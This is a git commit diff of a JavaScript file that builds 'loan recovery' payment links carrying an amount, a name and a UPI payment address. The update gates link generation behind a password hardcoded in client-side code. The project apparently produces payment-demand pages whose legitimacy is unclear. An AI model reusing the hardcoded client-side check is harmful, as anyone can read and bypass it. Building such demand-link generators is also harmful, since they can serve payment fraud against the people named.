83329b5176580de9d4c4e32bb0e63299a502932f
62746635880 <ayandevil840@gmail.com>
2025-04-23 19:08:37 +0500

    Update script.js

--- script.js
+++ script.js
@@ -1,10 +1,20 @@
 function generateURL() {
-    const baseUrl = "https:/62746635880.github.io/LOANRECOVERY/index.html";
+    const baseUrl = "https://loanrecovery.vercel.app/index.html";
     const amount = document.getElementById('amntInput').value;
     const name = document.getElementById('nameInput').value;
     const vpa = document.getElementById('vpaInput').value;
+    const password = document.getElementById('passwordInput').value;
 
-    const url = `${baseUrl}?amntInput=${encodeURIComponent(amount)}&nameInput=${encodeURIComponent(name)}&vpaInput=${encodeURIComponent(vpa)}`;
+    const correctPassword = "167";
 
-    document.getElementById('generated-url').innerHTML = `<a href="${url}" target="_blank">${url}</a>`;
-}
+    if (!password) {
+        alert("Please enter the password");
+        return;
+    }
+
+    if (password === correctPassword) {
+        const url = `${baseUrl}?amntInput=${encodeURIComponent(amount)}&nameInput=${encodeURIComponent(name)}&vpaInput=${encodeURIComponent(vpa)}`;
+        document.getElementById('generated-url').innerHTML = `<a href="${url}" target="_blank">${url}</a>`;
+    } else {
+        alert("Incorrect password");
+    }
